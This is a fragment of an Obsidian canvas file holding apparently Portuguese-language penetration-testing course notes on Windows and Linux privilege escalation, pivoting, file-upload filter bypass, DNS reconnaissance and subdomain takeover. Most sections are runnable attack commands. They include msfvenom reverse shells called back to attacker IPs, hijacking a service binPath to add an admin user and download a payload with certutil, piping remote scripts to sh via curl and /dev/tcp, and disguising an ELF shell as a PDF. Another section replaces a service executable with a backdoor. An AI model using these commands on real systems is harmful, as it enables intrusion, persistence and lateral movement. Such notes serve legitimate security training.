		{"id":"67bd4de22ea46ab9","type":"text","text":"## Windows PrivEsc Serviços I e II\n\n\nNos temos uma shell no servidor mas ela esta como uma permisao padrao\n![[brave_tAVfvWwDq4.png]]\n\nVamos identificar os servicos em  execucao\n```cmd\nwmic services get Name,State,PathNmae\n```\n![[brave_qkQlDrzvE0.png]]\n\nVamos buscar apenas por servicos rodando\n```cmd\nwmic services get Name,State,PathNmae | findstr \"Running\"\n```\n![[brave_toh23PH3AQ.png]]\n\nTemos alguns programas que foram instalados pelo usuario, eles podem ser um grande vetor de ataque pois podem ter vulnerabilidades vamos filtrar por eles\n```cmd\nwmic services get Nmae,State,PathNmae | findstr \"Running\" | findstr \"Program\"\n```\n![[brave_trID64REev.png]]\n\nAgora nos precisamos saber quais sao as permisoes destes servicos, vamos fazer isto\n```\nicacls \"CAMINHOQUEDESCOBRIMOSACIMA\"\n```\nVemos que o usuario desec tem o acesso (F) que e FULL, e justamente isso que estamos buscando\n![[brave_TZeDJt6xOa.png]]\n\nNos podemos fazer isso de outra forma tambem o arquivo SysinternalsSuite que baixamos na aula e UAC vai ser util\nTraz os servicos que tem permisao de escrita\n```cmd\ncd SysinternalsSuite\naccesschk.exe -wvcu \"Users\" *\n```\n![[Pasted image 20230403123036.png]]\n\nBom vemos que temos uma vulnerabilidade neste servico, vamo pegar algumas informacoes sobre ele\n```cmd\nsc query AdvancedSystemCareService13\n```\n![[Pasted image 20230403123548.png]]\n Podemos usar o mesmo comando para uma melhor pesquisa\n ```cmd\n sc qc AdvancedSystemCareService13\n```\n![[brave_Bs5PVzgZEy.png]]\n\nVamos imaginar que se eu tenho um nivel de acesso que eu consiga manipular alguma parte deste servico, eu poderia tentar alterar as configuracoes dele\n\nSabemos que nao podemos criar um usuario por ter um privilegio baixo.\n![[Pasted image 20230403123937.png]]\n\nVamos fazer o seguinte, sera que e possivel alterar aquele servico?, vamos fazer isso para ver se conseguimos acesso root, Fazendo isso vamos conseguir criar o usuario\n```\nsc config AdvancedSystemCareService13 binPath=\"net user hack Admin@123 /add\"\n```\n![[brave_vxN3N2QOT3.png]]\n\nBom fizemos uma auteracao no servico agora vamos ver oque esta dentro deste servico, como podemos ver o comando esta la,entao quando o servico executar ele ira iniciar o comando\n```\nsc qc AdvancedSystemCareService13\n```\n![[Pasted image 20230403124207.png]]\n\nAgora se nos reiniciarmos o servico ele ira executar o nosso comando, vamos desligar e ligar o servico\n```cmd\nstop AdvancedSystemCareService13\nstart AdvancedSystemCareService13\n```\nEle ira dar um erro porque tentamos executar um script, mas sera que ele realmente criou o usuario?\n![[Pasted image 20230403124331.png]]\n\nVamos ver se ele criou o usuario, vemos que sim o usuario foi criado\n```cmd\nnet user\n```\n![[Pasted image 20230403124410.png]]\n\nAgora a criatividade nao tem limites, sabendo que o comando que foi adicionado vai executar com successo podemos criar um exploit com o msfvenom\n```kali\nmsfvenom -p windows/shell_reverse_tcp lhost=192.168.0.16 lport=8080 -f exe > desec.exe\n```\n![[Pasted image 20230403124517.png]]\n\nColocamos o nc excutar a conexao\n```kali\nnc -vnlp 8080\n```\n![[Pasted image 20230403124521.png]]\n\nSubimos um servidor http com o python e mandamos a shell para o alvo\n```kalii\npython3 -m http.server 80\n```\n![[brave_vtUHpTSN1e.png]]\n\nVamos mandar o comando de tranferencia de arquivo pelo servico que encontramos.\n```cmd\nsc config AdvancedSystemCareService13 binPath=\"certutil -urlcache -f http://192.168.0.16/desec.exe desec.exe\"\n```\n![[brave_LPXGRQvqi1.png]]\n\nVamos reiniciar o servico\n```cmd\nstop AdvancedSystemCareService13\nstart AdvancedSystemCareService13\n```\n\nE agora vemos que o arquivo foi baixado\n![[brave_zSKTdGuWfd.png]]\n\nAgora precisamos executar o nosso arquivo\n```cmd\nsc query AdvancedSystemCareService13 binPath=\"desec.exe\"\n```\n![[Pasted image 20230403125111.png]]\n\nAgora e so para e iniciar o servico novamente e vamos obter a nossa shell\n```\nstop AdvancedSystemCareService13\nstart AdvancedSystemCareService13\n```\n![[Pasted image 20230403125122.png]]\n\n## Windows PrivEsc: Serviços II\n\nComo vimos na aula passada temos um outro servico chamado Serviio\n```cmd\nwmic services get Name,State,PathNmae | findstr \"Running\" | findstr \"Program\"\n```\n![[Pasted image 20230403125246.png]]\n\nVamos ver as permisoes dele\n```\nicacls \"CAMINHOQUEDESCOBRIMOSACIMA\"\n```\n![[Pasted image 20230403125344.png]]\n\nPoderiamos tentar fazer a mesma coisa que fizemos na aula passada mas nem sempre isto funciona, isso porque este servico e um pouco mas protegido\n![[Pasted image 20230403125359.png]]\n\nOque podemos fazer e por ter acesso full nos poderiamos tentar alterar o executavel, a ideia e tentar jogar um outro executavel malicioso para a maquina e subistituir pelo executavel que esta rodando. \n\nVamos fazer isto.\n\nVamos subir um servidor http em python\n```kali\npython3 -m http.server 80\n```\n![[Pasted image 20230403125626.png]]\n\nE vamos baixar o arquivo malicioso no alvo, podemos ja salvar o arquivo maliciosoo com o nome do servico como esta na imagen\n![[Pasted image 20230403125639.png]]\n\nVamos ver o diretorio que esta o servico original\n```cmd\nsc qc Serviio\n```\n![[brave_DTcgwnysok.png]]\n\nVamos entrar dentro do diretorio do servico\n```cmd\ncd CAMINDODOSERVICO\n```\n![[brave_ieLIpwuPBR.png]]\n\nOque vamos fazer e renomear o nome do servico original\n```cmd\nmove ServiioService.exe ServiioService_bkp.exe \n```\n\nAgora vamos voce a nossa backdor que e o servico falso para o diretorio que esta o original\n```cmd\nmove C:\\Users\\desec\\Desktop\\ServiioService.exe ServiioService.exe \n```\n![[brave_PcToSvygTD.png]]\n\nAgora e so reiniciar e iniciar o servico, so que nos tambem nao temos permisao para executar o comando para parar e inicar o servico\n![[Pasted image 20230403130230.png]]\n\nOque podemos fazer e forcar para reiniciar a maquina toda, depois disto e so esperar ele reinicar e recebemos a shell\n```cmd\nshutdown /r /t 0\n```\n![[Pasted image 20230403130256.png]]\n\n","x":15240,"y":440,"width":760,"height":515,"color":"4"},
		{"id":"8a921ffaa65bbd7d","type":"text","text":"## Linux","x":14760,"y":1320,"width":150,"height":80,"color":"6"},
		{"id":"3942ff1ba7117d26","type":"text","text":"## Enumeração do Host Linux\n\nApos conseguimos a shell precisamos fazer ela ser interativa para facilitar as coisas, vamos fazer isto.\n```\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\n```\n![[Pasted image 20230403130501.png]]\n\nUsuario atual\n```\nid\n```\n\nMostra todos os usuarios\n```\ncat /etc/passwd\n```\n\nMostra o nome da maquina\n```\nhostname\n```\n\nInformacoes do sistema operacional\n```\nuname -a\n```\n\nMostra a versao completa e outras coisas\n```\ncat /etc/*-release\n```\n\nBusca por programas instalados no sistema\n```\ndpkg -l\n```\n\nTraz os adaptadores de rede\n```\nifconfig -a\n```\n\nMostra a tabela de roteamento\n```\nroute\n```\n\nPortas abertas\n```\nnetstat -nlpt\nnetstat -nlpu\n```\n\nProcessos em execucao \n```\nps aux\n```\n\nVe o agendamento de tarefas\n```\ncat /etc/crontab\n```\n\nProcura todos os diretorios com permisao de escrita\n```\nfind / -writable -type d 2>/dev/null\n```\n\nBusca por arquivos que tem suitbise ativo\n```\nfind / -perm -u=s -type f 2>/dev/null\n```\n\nLista programas com permisao sudo para todo mundo\n```\nsudo -l\n```\n","x":15240,"y":1103,"width":760,"height":515,"color":"4"},
		{"id":"c2e8b6b68f057000","type":"text","text":"## Enumeração automatizada do Linux\n\nAlguns scripts para fazer isto de forma automatizada\nhttps://github.com/carlospolop/PEASS-ng/tree/master/linPEAS\n![[Pasted image 20230403131210.png]]\n\nVamos baixa-lo na nossa maquina\n```kali\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n```\n\nTemos varias formas de manda o linpeass para o alvo, aqui esta algumas delas\n\nRede local\n```kali\nsudo python -m http.server 80 #Host\ncurl 10.10.10.10/linpeas.sh | sh #Victim\n```\n\nSem o curl\n```kali\nsudo nc -q 5 -lvnp 80 < linpeas.sh #Host\ncat < /dev/tcp/10.10.10.10/80 | sh #Victim\n```\n\nExecuta da memoria e envia para o host\n```kali\nnc -lvnp 9002 | tee linpeas.out #Host\ncurl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim\n```\n\n---\n\nTemos tambem o linux exploit sugester\nhttps://github.com/The-Z-Labs/linux-exploit-suggester\n\nVamos baixar ele\n```kali\nwget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh\n```\n\nVamos executar ele no serviidor\n```linux\nchmod +x les.sh\n./les.sh\n```\n","x":16180,"y":1103,"width":780,"height":515,"color":"1"},
		{"id":"1bb03cf9ddf59f2c","type":"text","text":"## Privilégios e Mecanismos de Integridade\n\n\nVamos ver os grupos que nosso usuario faz parte\n```\nwhoami /groups\n```\n\nComo podemos ver no final no arquivo ele mostra o nosso nivel de prioridade que e medium\n![[Pasted image 20230403111701.png]]\n\nBasicamente sao usuarios com acesso prioritario, ou seja um medium e um basico nao conseguem criar aquivos mas ja um administrador ou um system consegue\n","x":17160,"y":-177,"width":803,"height":515,"color":"4"},
		{"id":"4cdc0deb61556ec0","type":"text","text":"## Windows Privilege Escalation Kernel Exploit\n\n## Caçando Kernel Vulnerável\n\nUm invasor sempre procurará escalonamento de privilégios se um kernel vulnerável enumerado for compilado. Isso poderia ser possível injetando script python ou PowerShell. Ele enumera com base no número da compilação e pode retornar o ID CVE para explorar facilmente a máquina e obter o Administrador. Acesso.\n![[Pasted image 20230927140254.png]]\n\n## Exploração do kernel usando ExploitDB\nAssim que o invasor tiver uma conexão reversa, ele poderá enumerar o kernel construído conforme destacado na imagem abaixo.\n![[opera_vBLNheB72e.png]]\n\nIsso o ajudará a descobrir uma exploração relacionada, caso ela seja vulnerável.\n![[Pasted image 20230927140520.png]]\n\nPara a versão do kernel relacionada, descobrimos que ela era vulnerável no MS11-046 (CVE: 2011-1249).\n![[opera_BmW9Izi6tk.png]]\n\nO mesmo pode ser enumerado usando searchsploit, que também é considerado uma versão offline do ExploitDB. Conforme ilustrado abaixo, podemos baixar o mesmo exploit de sua versão offline.\n```kali\nsearchsploit 40564\ni686-w64-mingw32-gcc 40564.c –o 40564.exe –lws2_32\n```\n![[opera_7XTiGUWaSz.png]]\n\nVamos iniciar o serviço SMB Share em um novo terminal com a ajuda do script impacket python conforme fornecido abaixo:\n```kali\nimpacket-smbserver share $(pwd)\n```\n![[opera_EUXoeKeklh.png]]\n\nIsso nos ajudará a importar exploits dentro de shells comprometidos com a ajuda do comando copy\n```kali\ncopy \\\\192.168.1.3\\share\\40564.exe\n```\n\nAssim que o exploit for baixado, podemos executar este programa para obter um shell de privilégios como NT Authority/system.\n![[opera_rEn1Ur87Dl.png]]\n\n## Exploração do kernel usando Metasploit\n\nDepois de enumerar o kernel construído, você pode usar o Google para obter o exploit disponível, enquanto você pode baixar o Windows Exploit Suggester – Next Generation (WES-NG) em seu kali Linux que irá caçar o exploit disponível para o kernel vulnerável construído. Você pode baixar este script da biblioteca do Github.\n\n```kali\ngit clone https://github.com/bitsadmin/wesng\ncd wesng\n```\n![[opera_QbbU5eN52w.png]]\n\nJá que salvamos o systeminfo de saída em um arquivo de texto e o nomeamos systeminfo.txt. Além disso, usamos essas informações para executar o script wes.py\n```kali\npython wes.py /root/systeminfo.txt\n```\n![[opera_j80pZxhu8O.png]]\n\nComo resultado, ele tentará determinar os patches ausentes e relatar a vulnerabilidade disponível e o impacto do risco. A partir da imagem abaixo, você pode observar que há um link apontado para exploração disponível no banco de dados de exploração.\n![[opera_qp3mL60PU6.png]]\n\nDesta vez usaremos o Metasploit para pós-exploração e procuraremos shell de privilégios com NT Authority Privileges.\n```kali\nuse exploit/windows/local/ms16_014_wmi_rec_notif\nset session 1\nexploit\n```\n\nNa execução bem-sucedida, ele concederá privilégios administrativos ao shell.\n![[opera_wL03GFF6ho.png]]\n\n","x":17160,"y":440,"width":803,"height":515,"color":"4"},
		{"id":"587f3990a382907f","type":"text","text":"## Linux PrivEsc Sudo\n\nPodemos pesquisar possiveis programas que tem permisao de sudo\n```\nsudo -l\n```\n![[Pasted image 20230403132044.png]]\n\nBom apartir daqui precisamos entender como que funciona o programa para fazer a escalacao, para isto voce pode ir ate a sua maquina linux e entrar no help da aplicacao ou ate mesmo procurar no google como faz a escalacao com aquele programa, no caso do vim quando vemos o help dele vemos que ele tem um parametro -c que serve para executar comandos, o exemplo de como ele executa o comando esta abaixo.\n```kali\nvim -c '!id'\n```\n![[Pasted image 20230403132056.png]]\n\nSabendo disto podemos executar o vim com o sudo, no caso vamos apenas fazer um este\n```kali\nsudo vim -c '!id'\n```\n![[Pasted image 20230403132135.png]]\n\nPodemos ver que ele executou como root, entao nos podemos executar qualquer comando no vim, sabendo disto podemos simplesmente executar um bash para ter o privilegio root que precisamos\n```\nsudo vim -c '!bash'\n```\n![[Pasted image 20230403132149.png]]\n![[brave_ItsBrh1yD7.png]]\n","x":17160,"y":1103,"width":803,"height":515,"color":"4"},
		{"id":"6a27f6c07f3e6268","type":"text","text":"## Linux PrivEsc Permissões e Cron\n\n```kali \ncat /etc/crontab\n```\n![[Pasted image 20230403132714.png]]\n\nO cron ele organiza seus arquivos por hora, dia, semana e mes, entao podemos entrar nos diretorios e ver oque tem dentro\n```\nls /etc/cron.hourly\ncat /etc/cron.hourly/clear.sh\n```\n![[Pasted image 20230403132727.png]]\n\nVamos ver que tipo de permisao tem este arquivo, como podemos ver ele tem permisao root\n```kali\nls -la /etc/cron.hourly/clear.sh\n```\n![[Pasted image 20230403132751.png]]\n\nEstes e um dos jeitos de achar o arquivo com permisao total, mas tambem podemos achar com o find\n```kali\nfind / -type f -perm 777 2>/dev/null\n```\n![[Pasted image 20230403132805.png]]\n\nAgora sabendo que o sistema tem uma permisao root como vamos explorar, bom por termos permisao root neste script podemos criar uma nova condicao dentro dele.\n```\nnano /etc/cron.hourly/clear.sh\n```\n![[Pasted image 20230403132827.png]]\n\nColocamos o nc na nossa maquina atacante escutando a porta 443 e esperamos, no caso aqui ele executa este comando por hora, entao temos que esperar mesmo.\n","x":17160,"y":1800,"width":803,"height":515,"color":"4"},
		{"id":"06be28477aab91f0","type":"text","text":"## Linux PrivEsc Kernel\n\nBom vamos olhar os diretorios que eu tenho permisao para baixar arquivos, e vamos entrar dentro de um\n```\nfind / -writable -type d 2>/dev/null\ncd /var/tmp\n```\n\nVamos verificar a versao do kernel e a versao do sistema\n```\nuname -a\ncat /etc/issue\n```\n![[Pasted image 20230403133106.png]]\n\nPodemos executar o LES que e o script para verificar exploits para a versao \n```\nwget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh --no-check-certificate\n```\n\nDamos permisao de execucao e executamos\n```\nchmod +x les.sh\n./les.sh\n```\n\nComo podemos ver ele trouxe 2 exploits\n![[Pasted image 20230403133131.png]]\n\nBom baixamos o exploit publico na nossa maquina atacante e fazemos as alteracoes que precisamos, ja aprendemos como fazer estas alteracoes.\nApartir daqui e so compilar o script e mandalo para o servidor, e executamos para conseguir a shell root\n![[Pasted image 20230403133142.png]]\n\n## Linux PrivEsc: Kernel (SUID)\nVamos achar  arquivos com suidbyte ativo\n```\nfind / -perm -u=s -type f 2>/dev/null\n```\n![[Pasted image 20230403133212.png]]\n\nVamos entrar em um diretorio que temos permisao de escrita e vamos criar um arquivo chamado cat so que este arquivo e um arquivo malicioso, vamos dar permisao a ele tambem\n```\ncd /tmp/\necho \"/bin/bash\" > cat\nchmod 777 cat\n```\n\nVamos ver as variaveis de ambiente\n```\nexport\n```\n![[Pasted image 20230403133237.png]]\n\nAlteramos o PATH para o diretorio que colocamos o nosso nc malicioso\n```kali\nexport $PATH\nexport PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/tmp\"\n```\n![[Pasted image 20230403133249.png]]\n\nAgora se executarmos um comando ele nos dara acesso root\n```\n/script/backup\n```","x":16180,"y":1800,"width":780,"height":515,"color":"4"},
		{"id":"adc29bf390de2880","type":"text","text":"## Linux PrivEsc PATH Variable\n\n\n## Método 1\nPrimeiro, você precisa comprometer o sistema de destino e depois passar para a fase de escalonamento de privilégios. Suponha que você tenha feito login com sucesso na máquina da vítima por meio de ssh. Então, sem perder tempo, procure o arquivo com permissão SUID ou 4000 com a ajuda do comando Localizar.\n\n```kali\nfind / -perm -u=s -type f 2>/dev/null\n```\n\nPortanto, com a ajuda do comando acima, um invasor pode enumerar qualquer arquivo executável, aqui também podemos observar /home/raj/script/shell tendo permissões suid.\n![[opera_ZD2ydwctRS.png]]\n\nEntão passamos para /home/raj/script e vimos um arquivo executável “shell”. Então, executamos este arquivo, e aqui parece que este arquivo está tentando executar ps e este é um arquivo genuíno dentro de /bin para obter o status do processo.\n```kali\nls\n./shell\n```\n![[opera_miHvRp9FgK.png]]\n\nTeste 1\n```kali\ncd /tmp\necho \"/bin/bash\" > ps\nchmod 777 ps\necho $PATH\nexport PATH=/tmp:$PATH\ncd /home/raj/script\n./shell\nwhoami\n```\n\nTeste 2\n```kali\ncd /home/raj/script/\ncp /bin/sh /tmp/ps\necho $PATH\nexport PATH=/tmp:$PATH\n./shell\nwhoami\n```\n\nTeste 3\n```kali\nln -s /bin/sh ps\nexport PATH=.:$PATH\n./shell\nid\nwhoami\n```\n\n![[opera_IgR35FiFWV.png]]\n\n## Método 2\n\nVamos achar o SUID\n```kali\nfind / -perm -u=s -type f 2>/dev/null\n```\n\nComando ECHO\n```kali\ncd /tmp\necho \"/bin/bash\" > id\nchmod 777 id\necho $PATH\nexport PATH=/tmp:$PATH\ncd /home/raj/script\n./shell2\nwhoami\n```\n\n## Método 3\n\nVamos achar o SUID\n```kali\nfind / -perm -u=s -type f 2>/dev/null\n```\n\nEditor Nano\n```kali\ncd /tmp\nnano cat\n```\n![[opera_NFlFBdKuAU.png]]\n\nEscalação\n```kali\nchmod 777 cat\nls -al cat\necho $PATH\nexport PATH=/tmp:$PATH\ncd /home/raj/script\n./raj\nwhoami\n```\n\n## Método 4\n\nVamos achar o SUID\n```kali\nfind / -perm -u=s -type f 2>/dev/null\n```\n\n```kali\ncd /home/raj/script/\nls\n./ignite\n```\n\nEditor VI\n```kali\ncd /tmp\nvi cat\n```\n![[opera_lmqV6BUhrg.png]]\n\nEscalação\n```kali\nchmod 777 cat\necho $PATH\nexport PATH=/tmp:$PATH\ncd /home/raj/script\n./ignite\nwhoami\n```\n\nAgora depois da escalacao podemos usar este comando para retornar a shell\n```\nexport PATH=/bin:/usr/bin:/usr/local/bin:$PATH\n```","x":15240,"y":1800,"width":760,"height":515,"color":"4"},
		{"id":"c76185f19800214f","type":"text","text":"## Transferências de arquivos File Type\n\nTecnica de tranferencia de arquivos pelo tipo que ele tem ,ate porque em determinadas situacoes voce pode ter acesso a um determinado servidor e ele estar com um hardening bem feito e voce nao consegui ter acesso a um wget ou um curl.\n\nMas as vezes a aplicacao ele permite voce subir um arquivo com um dedterminado tipo de extencao ou tipo de conteudo\n\nAplicacao\n![[brave_C7fzyIz7Ns.png]]\n\nCodigo que usamos anteriormente\n![[brave_b3rR6SD6JI.png]]\n\nCom este arquivo no servidor nos podemos executar comandos como ja vimos, vamo comecar a nossa transferencia de arquivos daqui.\n![[brave_6KU18uCdlG.png]]\n\noque nos podemos fazer e na nossa maquina pegar o netcat ou o msfvenom e metasploit para gerar um binario normal, vamos gerar um para linux\n```kali\nmsfvenom -p linux/x86/meterpreter/reverse_tcp lhost 172.16.1.6 lport=443 -f elf > shell\n```\n\nDeixamos nosso metasploit ja configurado e iniciamos ele\n![[brave_oc54a4cAoM.png]]\n\nVamos criar um arquivo chamado header e vamos fazer com que ele se pareca como um pdf\n```header\n%PDF-1.3\n```\n![[brave_aKNOGJZbgY.png]]\n\nBom agora nos temos o binario da nossa shell e o nosso arquivo header\n![[brave_qwlM4kAmPf.png]]\n\nVamos juntar os 2 para que conseguimos enviar o arquivo malicioso, o motivo disso e porque a aplicacao so aceita pdf entao precisamos camuflar a nossa shell, por isso precisamos do arquivo header, vamos fundir os 2 arquivos em 1\n```kali\ncat header shell > kair\n```\n![[brave_ZCBNXrEO1F.png]]\n\nPrecisamos tambem editar a extencao do arquivo\n```kali\nmv kair kair.pdf\n```\n![[brave_VjQtlLbvcS.png]]\n\nAgora podemos enviar o nosso arquivo malicioso para o site\n![[brave_83Mu1fMXw3.png]]\n\nVamos usar o propio rce que nos ja tinhamos para ver se o arquivo esta em uploads\n![[brave_l0QZ0mHzR7.png]]\n\nOque precisamos fazer agora e editar ele para conseguimos executar o arquivo pois agora ele esta sendo reconhecido como pdf, para isso podemos usar o tail, oque o tail esta fazendo e eliminado a 1 linha.\n```\n&hack=tail -n +2 /uploads/kair.pdf kair\n```\n\nAgora podemos executar o arquivo\n```\n&hack=./kair\n```\n\nQuando executamos o arquivo nos recebemos uma shell\n![[brave_fa8N6E1jlB.png]]\n","x":11862,"y":4320,"width":1195,"height":911,"color":"4"},
		{"id":"253f1f3c24c74fb3","type":"text","text":"## Pivoting\n\nPivoting basicamente se consiste voce pular de um computador para o outro\nSo um adendo a shell que estamos usar e meterpreter>\n\nCom a shell obtida temos que olhar a rede do sistema\n```\nipconfig\n```\n![[Pasted image 20230403134003.png]]\n\nPodemos usar o route tambem para ver as redes\n```\nroute\n```\n![[Pasted image 20230403134016.png]]\n\nVamos fazer comunicar com estas redes\n```\nrun autoroute -s 10.10.20.0/24\nrun autoroute -p\n```\n![[Pasted image 20230403134027.png]]\n\nVamos voltar para nosa maquina mas sem matar esta sessao que criamos\n```\nbackground\nsessions\n```\n![[Pasted image 20230403134038.png]]\n\nVamos utilizar algumas coisas do metasploit\n```\nuse auxiliary/server/socks4a\nrun\n```\n\nAgora em outro terminal vemos que a porta 1080 foi aberta, vamo agora configurar algumas coisas do proxychains\nNo final da lista apenas auteramos a porta para 1080\n```\nnano /etc/proxychains.conf\n```\n![[Pasted image 20230403134100.png]]\n\nFeito isto estamos prontos para comunicar com o proxychains e conseguimos comunicar com aquela rede\nAchamos uma porta 110 vamos fazer algumas coisas\n```\nproxychains nmap --open -sT -p 110,139 -Pn 10.10.20.0/24\n```\n\nVamos voltar ao nosso meterpreter e vamos fazer uma configuracao para direcionar a porta\n```\nsessions -i 1\n```\n\nCom a porta que achamos podemos fazer um tunelamento\n```\nportfwd add -l 110 -p 110 -r 10.10.20.4\n```\n\nAgora se voltarmos no nosso kali vemos que tamos a porta 110 aberta \n![[Pasted image 20230403134115.png]]\n\nAgora podemos escanear a porta localmente \n```\nnmap -v -sV -p 110 127.0.0.1\n```\n\nE como podemos ver estamos dentro da rede da gbusiness.rede\n![[Pasted image 20230403134127.png]]\n\n\n![[Discord_NqfYEEORCD.png]]\n","x":13333,"y":4320,"width":987,"height":911,"color":"1"},
		{"id":"10d8a6510adb7920","type":"text","text":"## Coleta através de certificados digitais\n\nQuando se tem um https os dados estão criptografados e a COMUNICACAO e mas segura.\n![[Pasted image 20230203184249.png]]\n\nsite: www.transparencyreport.google.com\n![[Pasted image 20230203184301.png]]\n\nsite: www.crt.sh\n![[Pasted image 20230203184311.png]]\n","x":3510,"y":-80,"width":1300,"height":940,"color":"4"},
		{"id":"e037350a75f0db31","type":"text","text":"## Serviços para pesquisa passiva\n\nsite: www.virustotal.com/gui/home/upload\n![[Pasted image 20230203184126.png]]\n\nsite: www.dnsdumpster.com\n![[Pasted image 20230203184136.png]]\n\nsite: www.securitytrails.com/#search\n![[Pasted image 20230203184145.png]]","x":3510,"y":1046,"width":1300,"height":906,"color":"4"},
		{"id":"881cf3f192db66bf","type":"text","text":"## Outras Ferramentas para DNS\n\n```kali\n#---------------------------------------------------------------#\ndnsenum --enum terra.com.br\n#---------------------------------------------------------------#\ndnsrecom -d terra.com.br\n#---------------------------------------------------------------#\nfierce -dns terra.com.br\n#---------------------------------------------------------------#\n```\n\ndig normal\n```kali\ndig -t ns terra.com.br\n```\ndig transferencia de zona\n```kali\ndig -t axfr terra.com.br @ns1.terra.com.br\n```","x":3707,"y":2120,"width":906,"height":477,"color":"4"},
		{"id":"047b9eab464f60ee","type":"text","text":"## Tomando controle de subdomínios\n\n![[Screenshot_188.png]]\n\naqui no caso o bucket e da amazon\n![[Screenshot_189.png]]\n\nvamos ate o site da amazon para criar e registrar o bucket para um subdomain takeover\n![[Screenshot_190.png]]\n","x":3716,"y":2848,"width":888,"height":521,"color":"4"},
		{"id":"d7ac96cc6012e094","type":"text","text":"## Subdomain Takeover\n\n![[Screenshot_185.png]]\n![[Screenshot_186.png]]\n\n![[Screenshot_187.png]]\n","x":3680,"y":4360,"width":960,"height":560,"color":"4"},
		{"id":"81f7bac36bd25afa","type":"text","text":"## Criando um script para subdomain takeover\n\n``./script.sh google.com``\n```bash\n#!/bin/bash\nfor palavra in $(cat lista.txt);\ndo\nhost -t cname $palavra.$1 | grep \"alias for\"\ndone\n```\n","x":3750,"y":3680,"width":820,"height":335,"color":"4"}
	],
	"edges":[
		{"id":"dcaba8b65434f6f8","fromNode":"77052acd1db16b7c","fromSide":"top","toNode":"cf991922d77de479","toSide":"bottom"},
		{"id":"09007807bfaecff5","fromNode":"c2159b61def60e7c","fromSide":"top","toNode":"3f48d3f1b91a39d6","toSide":"bottom"},
		{"id":"65c6ba044bda44f4","fromNode":"3f48d3f1b91a39d6","fromSide":"right","toNode":"9cb8e00bc35378f6","toSide":"left"},
		{"id":"3e9a38689b8590fa","fromNode":"4995c78f29138d5a","fromSide":"bottom","toNode":"f6d67c2bb4d2b183","toSide":"top"},
		{"id":"ace12d5472228927","fromNode":"f6d67c2bb4d2b183","fromSide":"left","toNode":"cf991922d77de479","toSide":"right"},
		{"id":"fe81280758bdcb6e","fromNode":"5e74d822249401c8","fromSide":"right","toNode":"00aa7b4da6fcee8d","toSide":"left"},
		{"id":"f52b30881dc50b58","fromNode":"00aa7b4da6fcee8d","fromSide":"right","toNode":"385f43943ca6db9b","toSide":"left"},
		{"id":"0f42eb23ae62b71a","fromNode":"385f43943ca6db9b","fromSide":"right","toNode":"77052acd1db16b7c","toSide":"left"},
		{"id":"a9daaf1ceb0ca5f0","fromNode":"77052acd1db16b7c","fromSide":"right","toNode":"790a16e732a8393e","toSide":"left"},
		{"id":"2efcf49e9bfb438a","fromNode":"67f85b9ba8ea1a4f","fromSide":"right","toNode":"9f1207f78a20403b","toSide":"left"},
		{"id":"bd33790ab198ab1d","fromNode":"9f1207f78a20403b","fromSide":"bottom","toNode":"e3a9cead6cfd45d5","toSide":"top"},
		{"id":"bbe2ba9f3812dd4a","fromNode":"e3a9cead6cfd45d5","fromSide":"left","toNode":"79ef4d7c64beb963","toSide":"right"},
		{"id":"f684fe66782e5171","fromNode":"79ef4d7c64beb963","fromSide":"bottom","toNode":"fd026a8114829ae9","toSide":"top"},
		{"id":"811ba93208c8f2ca","fromNode":"fd026a8114829ae9","fromSide":"right","toNode":"7a75c7c10a251e45","toSide":"left"},
		{"id":"a24683c990c89af3","fromNode":"fd026a8114829ae9","fromSide":"right","toNode":"cae38e0ab2c4d6b6","toSide":"left"},
		{"id":"74631844dd635a1c","fromNode":"790a16e732a8393e","fromSide":"bottom","toNode":"67f85b9ba8ea1a4f","toSide":"top","label":"Normal"},
		{"id":"3ccae69a52052df1","fromNode":"790a16e732a8393e","fromSide":"right","toNode":"9608105bae9fd053","toSide":"left"},
		{"id":"1d8486ae2060f5df","fromNode":"9608105bae9fd053","fromSide":"top","toNode":"3e1d60da3538c52d","toSide":"bottom","label":"Normal"},
		{"id":"1a2a2893794256f8","fromNode":"3e1d60da3538c52d","fromSide":"top","toNode":"132bb9150e85d271","toSide":"bottom"},
		{"id":"b9944c1f703ef224","fromNode":"132bb9150e85d271","fromSide":"right","toNode":"6cd1d33f3da163f6","toSide":"left"},
		{"id":"fa856cd70e4ed75e","fromNode":"6cd1d33f3da163f6","fromSide":"bottom","toNode":"f9f66f93ecbb5c7f","toSide":"top"},
		{"id":"634353fbb787d9b8","fromNode":"f9f66f93ecbb5c7f","fromSide":"right","toNode":"27357498336161f1","toSide":"left"},
		{"id":"311329a4a2db4732","fromNode":"27357498336161f1","fromSide":"top","toNode":"5340ca4bf3f74826","toSide":"bottom"},
		{"id":"3fbceee8fdfd3de1","fromNode":"2b4b6311febe38a3","fromSide":"left","toNode":"635d1babbadd2f23","toSide":"right"},
		{"id":"fc29e66b38dd8e30","fromNode":"5340ca4bf3f74826","fromSide":"top","toNode":"2b4b6311febe38a3","toSide":"bottom"},
		{"id":"b50aab046d41f0b7","fromNode":"635d1babbadd2f23","fromSide":"left","toNode":"cb69c5c046c301be","toSide":"right"},
		{"id":"fbb2bd5422f14251","fromNode":"cb69c5c046c301be","fromSide":"top","toNode":"b0c602e4465a463c","toSide":"bottom"},
		{"id":"3b1804243c0030ac","fromNode":"b0c602e4465a463c","fromSide":"right","toNode":"20e89dd2fb3fe9a7","toSide":"left"},
		{"id":"62664c721ed987ee","fromNode":"20e89dd2fb3fe9a7","fromSide":"right","toNode":"2a56322eb0305a16","toSide":"left"},
		{"id":"0cfad0a51cc588f8","fromNode":"89b73c01c10062ae","fromSide":"left","toNode":"a8a410ace8774dad","toSide":"right"},
		{"id":"dd267fceb81d9879","fromNode":"9608105bae9fd053","fromSide":"right","toNode":"a3afb6be60781d32","toSide":"left"},
		{"id":"f7cd819785f0063a","fromNode":"a3afb6be60781d32","fromSide":"bottom","toNode":"6c8b7d030f931a5f","toSide":"top"},
		{"id":"8f911d84be7e3a07","fromNode":"6c8b7d030f931a5f","fromSide":"bottom","toNode":"529d45060787c429","toSide":"top"},
		{"id":"30229744a50e3610","fromNode":"529d45060787c429","fromSide":"bottom","toNode":"f64195d968ebbb24","toSide":"top"},
